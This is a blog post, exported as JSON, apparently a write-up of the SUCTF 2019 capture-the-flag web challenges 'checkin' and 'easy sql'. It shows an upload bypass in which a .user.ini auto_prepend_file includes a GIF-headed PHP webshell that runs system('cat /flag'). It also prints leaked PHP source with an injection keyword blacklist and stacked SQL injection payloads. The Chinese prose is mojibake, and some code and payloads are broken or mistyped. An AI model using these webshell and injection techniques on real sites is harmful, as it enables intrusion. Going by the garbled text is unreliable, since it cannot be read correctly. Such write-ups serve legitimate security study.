{"title":"SUCTF-2019","slug":"suctf-2019-WP","date":"2019-09-10T10:15:38.000Z","updated":"2019-09-11T14:54:46.974Z","comments":true,"path":"api/articles/suctf-2019-WP.json","photos":[],"link":"","excerpt":null,"covers":["https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png"],"content":"<h1 id=\"SUCTF-2019-WP\"><a href=\"#SUCTF-2019-WP\" class=\"headerlink\" title=\"SUCTF-2019 WP\"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>\n<h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª <code>websell.php</code>ï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹<code>php5</code>ã€<code>php4</code>ã€<code>content-type</code>è¿™äº›éƒ½ä¸è¡Œ)ã€‚</p>\n<p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º <code>&amp;lt;? in contents!</code> ï¼Œå°±æ˜¯è¯´<code>&lt; ?</code>ä¸èƒ½è¿ç»­å­˜åœ¨ã€‚</p>\n<p>æˆ‘ä»¬é€šè¿‡<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>æ¥ç»•è¿‡å¯¹<code>&lt;?</code>çš„æ£€æµ‹ã€‚è¿™æ¬¡æˆ‘ä»¬å¾—åˆ°å›æ˜¾<br>    exif_imagetype:not image!</p>\n<p><code>exif_imagetype</code>ç”¨æ¥åˆ¤æ–­å›¾ç‰‡ç±»å‹ï¼Œä»–è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚åªè¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªå›¾ç‰‡å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚æ·»åŠ <code>GIF89a</code>.åœ¨æ·»åŠ å®Œä¹‹åæˆ‘ä»¬ä¸Šä¼ æˆåŠŸï¼Œæ­¤æ—¶çš„æ–‡ä»¶ç›®å½•ä¸‹é™¤äº†æˆ‘ä»¬ä¸Šä¼ çš„<code>webshell</code>è¿˜æœ‰ä¸€ä¸ª<code>index.php</code>.</p>\n<h3 id=\"user-ini-æ–‡ä»¶æ„æˆçš„åé—¨\"><a href=\"#user-ini-æ–‡ä»¶æ„æˆçš„åé—¨\" class=\"headerlink\" title=\".user.ini æ–‡ä»¶æ„æˆçš„åé—¨\"></a>.user.ini æ–‡ä»¶æ„æˆçš„åé—¨</h3><p>è¯¦æƒ…çœ‹pç¥è¿™ç¯‡æ–‡ç« <a href=\"http://www.vuln.cn/6001\" title=\"ç‚¹è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<blockquote>\n<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>\n</blockquote>\n<blockquote>\n<p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>\n</blockquote>\n<p><code>.user.ini</code>ç±»ä¼¼ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„<code>php.ini</code>ã€‚æˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯â€<code>PHP_INI_PERDIR</code> ã€ <code>PHP_INI_USER</code>â€œçš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„<code>PHP_INI_PERDIR</code>ä¹Ÿå¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®ï¼‰</p>\n<p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬<code>PHP_INI_ALL</code>ï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡<code>.user.ini</code>æ¥è®¾ç½®çš„ã€‚</p>\n<p>å’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt=\"phpä¸­ä¸¤ä¸ªé…ç½®\"></p>\n<p><code>auto_prepend_file</code> æ„å‘³è¿™æ˜¯åœ¨phpè„šæœ¬æ‰§è¡Œå‰ä¼šæ‰§è¡Œè¿™ä¸ªå‚æ•°è®¾ç½®çš„è„šæœ¬ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨<code>require()</code>ç„¶åè¿™ä¸ªå‚æ•°çš„è„šæœ¬æ‰€åœ¨ç›®å½•å—<code>include_path</code>é™åˆ¶<br><code>append</code>æ˜¯åœ¨<code>php</code>è„šæœ¬æ‰§è¡Œåæ‰æ‰§è¡Œçš„ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯é‡åˆ°<code>exit()</code>çš„æ—¶å€™ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¸èƒ½è¿è¡Œ</p>\n<p>ä½¿ç”¨çš„æ—¶å€™ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p>\n<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªé…ç½®é¡¹æ¥è®©æ‰€æœ‰çš„phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚ğŸ‘</p>\n<p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚</p>\n<p>.htaccessæ–‡ä»¶æ„æˆçš„åé—¨çœ‹è¿™é‡Œï¼š<a href=\"https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet\" title=\".htaccess\">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>è¿™ä¸ªåªèƒ½ç”¨äºApache</p>\n<p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å‘ç°å½“å‰ç›®å½•ä¸‹ç¡®å®æœ‰<code>index.php</code>å¯ä»¥åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹å§ğŸˆ</p>\n<h3 id=\"å¼€å§‹ä¸Šä¼ \"><a href=\"#å¼€å§‹ä¸Šä¼ \" class=\"headerlink\" title=\"å¼€å§‹ä¸Šä¼ \"></a>å¼€å§‹ä¸Šä¼ </h3><p>æˆ‘ä»¬å…ˆæ„é€ <code>.user.ini</code>æ–‡ä»¶</p>\n<pre><code>GIF89a\nauto_prepend_file=CK.jpg</code></pre><p>ç„¶åå°†å…¶ä¸Šä¼ </p>\n<p>æ¥ç€æ„é€ å›¾ç‰‡é©¬<code>CK.jpg</code></p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    system(&apos;cat /flag&apos;);\n&lt;/script&gt;</code></pre><p>æˆåŠŸä¸Šä¼ ä¹‹åæˆ‘ä»¬è®¿é—®ä¸Šä¼ åçš„é¡µé¢å³å¯çœ‹åˆ°flagã€‚</p>\n<h2 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy sql\"></a>easy sql</h2><p>å­˜åœ¨å †å æ³¨å…¥ï¼Œæµ‹è¯•<code>1;show tables;</code>å›æ˜¾</p>\n<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>æµ‹è¯•<code>1;select * from Flag;</code>,flagè¢«è¿‡æ»¤äº†</p>\n<p><code>.index.php.swp</code>å­˜åœ¨æºç æ³„éœ²,æºç å¦‚ä¸‹  </p>\n<pre><code>&lt;?php\n    session_start();\n\n    include_once &quot;config.php&quot;;\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);\n    if(!$MysqlLink){\n        die(&quot;Mysql Connect Error!&quot;);\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(&quot;Choose Database Error!&quot;);\n    }\n\n    foreach ($_POST as $k=&gt;$v){\n        if(!empty($v)&amp;&amp;is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=&gt;$v){\n        }\n    }\n    //die();\n    ?&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n    if(isset($post[&apos;query&apos;])){\n        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;;\n        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));\n        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){\n            //echo $post[&apos;query&apos;];\n            die(&quot;Nonono.&quot;);\n        }\n        if(strlen($post[&apos;query&apos;])&gt;40){\n            die(&quot;Too long.&quot;);\n        }\n        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>\n<h3 id=\"logical-OR\"><a href=\"#logical-OR\" class=\"headerlink\" title=\"|| logical OR\"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;\n        -&gt; 1\nmysql&gt; SELECT 1 OR 0;\n        -&gt; 1\nmysql&gt; SELECT 0 OR 0;\n        -&gt; 0\nmysql&gt; SELECT 0 OR NULL;\n        -&gt; NULL\nmysql&gt; SELECT 1 OR NULL;\n        -&gt; 1</code></pre><blockquote>\n<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>\n</blockquote>\n<h3 id=\"å¦‚ä½•åšï¼Ÿ\"><a href=\"#å¦‚ä½•åšï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•åšï¼Ÿ\"></a>å¦‚ä½•åšï¼Ÿ</h3><p>å…ˆæ¥çœ‹ä¸€ä¸ªmsqlçš„é…ç½®</p>\n<p><strong>PIPES_AS_CONCAT</strong></p>\n<blockquote>\n<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>\n</blockquote>\n<p>å¦‚æœé…ç½®äº†<code>sql_mode=PIPES_AS_CONCAT</code>ï¼ŒMysqlä¼šæŠŠé€»è¾‘æˆ–å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²é“¾æ¥å‡½æ•°å¯¹å¾…ã€‚  </p>\n<p><strong>CONCAT(str1,str2,â€¦)</strong></p>\n<blockquote>\n<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>\n</blockquote>\n<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>\n<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);\n        -&gt; &apos;MySQL&apos;\nmysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);\n        -&gt; NULL\nmysql&gt; SELECT CONCAT(14.3);\n        -&gt; &apos;14.3&apos;</code></pre><p>æˆ‘ä»¬é€šè¿‡<code>sql_mode=PIPES_AS_CONCAT</code>æ¥å°†flagå¸¦å‡ºæ¥</p>\n<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>\n<p>è¯­å¥ä¸º:</p>\n<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id=\"éé¢„æœŸ\"><a href=\"#éé¢„æœŸ\" class=\"headerlink\" title=\"éé¢„æœŸ\"></a>éé¢„æœŸ</h3><p>payload:<code>*,1</code>æ„é€ <code>select *,1 || flag from Flag;</code> å³å¯æŸ¥å‡ºå…¨éƒ¨å†…å®¹ã€‚</p>\n","categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]}